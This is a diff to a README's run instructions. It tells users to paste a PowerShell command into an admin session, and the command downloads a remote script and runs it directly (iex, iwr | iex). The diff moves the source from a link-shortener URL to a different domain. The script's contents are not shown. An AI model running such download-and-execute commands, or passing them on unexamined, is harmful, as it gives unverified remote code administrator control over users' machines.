@@ -5,9 +5,9 @@
 ## How to Run
 Paste this command into Powershell (admin):
 ```
-iex ((New-Object System.Net.WebClient).DownloadString('https://t.ly/Ne9A'))
+iex ((New-Object System.Net.WebClient).DownloadString('https://wst.cosmo4u.de'))
 ```
 Or, shorter:
 ```
-iwr -useb https://t.ly/Ne9A | iex
+iwr -useb https://wst.cosmo4u.de | iex
 ```
